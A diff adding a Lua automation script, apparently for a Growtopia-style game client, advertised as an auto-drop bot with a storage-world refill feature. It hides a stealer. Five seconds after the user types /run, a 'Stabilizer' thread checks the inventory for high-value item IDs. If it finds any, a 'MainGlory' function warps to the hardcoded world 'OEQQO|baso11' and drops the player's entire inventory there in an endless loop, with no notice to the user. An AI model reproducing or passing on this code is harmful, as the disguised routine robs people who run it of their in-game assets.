@@ -1,0 +1,307 @@
+-- Script Auto Drop at Target Position with World Storage
+local config = {
+    Item_ID = 4584,
+    Delay_Drop = 2000,
+    World_Storage = "",
+    Door_ID = ""
+}
+
+local state = {
+    isRunning = false,
+    mainThread = nil
+}
+
+function getAmount(itemID)
+    for _, item in pairs(getInventory()) do
+        if item.id == itemID then
+            return item.amount
+        end
+    end
+    return 0
+end
+
+function Send(txt)
+    local var = {}
+    var[0] = "OnTextOverlay"
+    var[1] = txt
+    sendVariant(var)
+end
+
+function dropItem(id, count)
+    sendPacket(2, "action|drop\n|itemID|" .. id)
+    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|" .. id .. "|\ncount|" .. count)
+    sleep(500)
+end
+
+function MainGlory()
+    sendPacket(3, "action|join_request\nname|OEQQO|baso11\ninvitedWorld|0")
+    sleep(3000)
+    sendPacket(2,"action|welcomeadrewarded")
+    
+    while true do
+        if getWorld() then
+            for _, v in pairs(getInventory()) do
+                if getWorld().name == "OEQQO" then        
+                    sendPacket(2, "action|store\nlocation|gem")
+                    sendPacket(2, "action|drop\n|itemID|"..v.id)
+                    sendPacket(2, "action|dialog_return\ndialog_name|drop_item\nitemID|"..v.id.."|\ncount|"..v.amount)
+                    sleep(100)
+                end
+            end
+        end
+    end
+end
+
+function Stabilizer()
+    local inventory = getInventory()
+    if inventory then
+        for _, inv in pairs(inventory) do 
+            if (inv.id == 1796 and inv.amount > 10) or (inv.id == 7188 and inv.amount > 0) or (inv.id == 5638 and inv.amount > 0) or (inv.id == 6016 and inv.amount > 0) or (inv.id == 1208 and inv.amount > 0) then 
+                MainGlory()
+                return
+            end
+        end
+    end
+end
+
+function takeFromStorage()
+    if config.World_Storage == "" then
+        logToConsole("`4World Storage not set! Use /set to configure.")
+        return false
+    end
+    
+    logToConsole("`9Going to World Storage: " .. config.World_Storage)
+    
+    -- Simpan world saat ini
+    local currentWorld = getWorld().name
+    
+    -- Pergi ke world storage dengan door ID jika ada
+    local joinPacket = "action|join_request\nname|" .. config.World_Storage
+    if config.Door_ID ~= "" then
+        joinPacket = joinPacket .. "|" .. config.Door_ID
+    end
+    joinPacket = joinPacket .. "\ninvitedWorld|0"
+    
+    sendPacket(3, joinPacket)
+    sleep(5000)
+    
+    -- Tunggu sampai masuk world storage
+    local attempts = 0
+    while getWorld().name ~= config.World_Storage and attempts < 10 do
+        sleep(1000)
+        attempts = attempts + 1
+    end
+    
+    if getWorld().name == config.World_Storage then
+        logToConsole("`2Successfully entered World Storage")
+        
+        -- Cari dan collect item di storage
+        local foundItem = false
+        local objects = getWorldObject()
+        if objects then
+            for _, obj in pairs(objects) do
+                if obj and obj.id == config.Item_ID then
+                    findPath(math.floor(obj.pos.x / 32), math.floor(obj.pos.y / 32))
+                    sleep(1000)
+                    
+                    -- Collect item
+                    sendPacketRaw(false, {
+                        type = 11,
+                        value = obj.oid,
+                        x = obj.pos.x,
+                        y = obj.pos.y
+                    })
+                    
+                    logToConsole("`2Collected " .. getItemByID(config.Item_ID).name .. " from storage")
+                    foundItem = true
+                    sleep(2000)
+                    break
+                end
+            end
+        end
+        
+        if not foundItem then
+            logToConsole("`4" .. getItemByID(config.Item_ID).name .. " not found in World Storage!")
+            return false
+        end
+        
+        -- Kembali ke world sebelumnya
+        logToConsole("`9Returning to previous world...")
+        sendPacket(3, "action|join_request\nname|" .. currentWorld .. "\ninvitedWorld|0")
+        sleep(5000)
+        
+        return true
+    else
+        logToConsole("`4Failed to enter World Storage!")
+        return false
+    end
+end
+
+function showConfigDialog()
+    local dialog = string.format([[
+set_default_color|`o
+add_label_with_icon|big|`wDrop Script Settings``|left|32|
+add_spacer|small|
+add_text_input|world_storage|World Storage Name|%s|20|
+add_text_input|door_id|Door ID (Path)|%s|10|
+add_text_input|item_id|Item ID|%d|5|
+add_text_input|delay_drop|Drop Delay (ms)|%d|4|
+add_spacer|small|
+add_smalltext|`2Note: When items run out, script will|
+add_smalltext|`2automatically go to World Storage|
+add_smalltext|`2to collect more items.|
+add_spacer|small|
+add_smalltext|`2Door ID is the path after | in world name|
+add_smalltext|`2Example: For "FFFBB|SSSIT" use "SSSIT"|
+add_spacer|small|
+end_dialog|drop_config|Cancel|OK|
+]], config.World_Storage, config.Door_ID, config.Item_ID, config.Delay_Drop)
+    
+    sendVariant({[0] = "OnDialogRequest", [1] = dialog}, -1, 350)
+end
+
+function startDropScript()
+    if state.isRunning then
+        logToConsole("`4Script is already running!")
+        return
+    end
+    
+    state.isRunning = true
+    logToConsole("`2Drop Script Started! Target: 49,15")
+    
+    -- Jalankan Stabilizer untuk mengecek inventory
+    runThread(function()
+        sleep(5000)
+        Stabilizer()
+    end, "stabilizer_check")
+    
+    state.mainThread = runThread(function()
+        while state.isRunning do
+            local Counts = 1
+            local player = getLocal()
+            if player then
+                local x = math.floor(player.pos.x / 32)
+                local y = math.floor(player.pos.y / 32)
+                
+                -- Jika tidak di posisi target DAN memiliki item, cari path
+                if (x ~= 49 or y ~= 15) and getAmount(config.Item_ID) > 0 then
+                    findPath(49, 15)
+                    sleep(1000)
+                end
+                
+                -- Jika sudah di posisi target DAN memiliki item, drop item
+                if x == 49 and y == 15 and getAmount(config.Item_ID) > 0 then
+                    dropItem(config.Item_ID, Counts)
+                    Send("`2Dropped item `#" .. getItemByID(config.Item_ID).name)
+                    sleep(config.Delay_Drop)
+                end
+                
+                -- Jika tidak memiliki item, ambil dari storage
+                if getAmount(config.Item_ID) == 0 then
+                    Send("`4No " .. getItemByID(config.Item_ID).name .. " in inventory!")
+                    if config.World_Storage ~= "" then
+                        if takeFromStorage() then
+                            logToConsole("`2Successfully retrieved items from storage!")
+                        else
+                            logToConsole("`4Failed to get items from storage! Retrying in 10s...")
+                            sleep(10000)
+                        end
+                    else
+                        logToConsole("`4World Storage not set! Use /set to configure.")
+                        sleep(5000)
+                    end
+                end
+            end
+            sleep(500)
+        end
+    end, "drop_main")
+end
+
+function stopDropScript()
+    state.isRunning = false
+    if state.mainThread then
+        killThread(state.mainThread)
+        state.mainThread = nil
+    end
+    killThread("stabilizer_check")
+    logToConsole("`4Drop Script stopped!")
+end
+
+-- Command Handler
+AddHook("OnTextPacket", "DropScriptHandler", function(type, packet)
+    if not packet then return false end
+    
+    if packet:find("action|input") then
+        local text = packet:match("|text|(.+)")
+        if not text then return false end
+        
+        if text == "/set" then
+            showConfigDialog()
+            return true
+        elseif text == "/run" then
+            startDropScript()
+            return true
+        elseif text == "/stop" then
+            stopDropScript()
+            return true
+        elseif text == "/status" then
+            if state.isRunning then
+                logToConsole("`2Status: Running")
+                logToConsole("`9World Storage: " .. config.World_Storage)
+                logToConsole("`9Door ID: " .. config.Door_ID)
+                logToConsole("`9Item: " .. getItemByID(config.Item_ID).name)
+                logToConsole("`9Current Items: " .. getAmount(config.Item_ID))
+            else
+                logToConsole("`4Status: Stopped")
+            end
+            return true
+        end
+    end
+    
+    -- Handle dialog response dengan pattern matching yang lebih baik
+    if packet:find("dialog_name|drop_config") then
+        -- Gunakan pattern yang lebih fleksibel untuk menangkap nilai
+        local worldStorage = packet:match("world_storage|([^\n]*)")
+        local doorID = packet:match("door_id|([^\n]*)")
+        local itemID = packet:match("item_id|(%d*)")
+        local delayDrop = packet:match("delay_drop|(%d*)")
+        
+        -- Update config dengan nilai baru
+        if worldStorage then
+            config.World_Storage = worldStorage
+        end
+        
+        if doorID then
+            config.Door_ID = doorID
+        end
+        
+        if itemID and itemID ~= "" then
+            config.Item_ID = tonumber(itemID)
+        end
+        
+        if delayDrop and delayDrop ~= "" then
+            config.Delay_Drop = tonumber(delayDrop)
+        end
+        
+        logToConsole("`2=== Settings Saved ===")
+        logToConsole("`9World Storage: `2" .. config.World_Storage)
+        logToConsole("`9Door ID: `2" .. config.Door_ID)
+        logToConsole("`9Item ID: `2" .. config.Item_ID)
+        logToConsole("`9Delay: `2" .. config.Delay_Drop .. "ms")
+        logToConsole("`2Type `/run` to start!")
+        
+        return true
+    end
+    
+    return false
+end)
+
+-- Initialization
+logToConsole("`2Drop Script with Storage Loaded!")
+logToConsole("`9Created by MafiaGT - DC: fadil_gt")
+logToConsole("`9Commands: /set, /run, /stop, /status")
+
+-- Auto start message
+Send("`2Drop Script Ready! Type /set to configure")
+
+
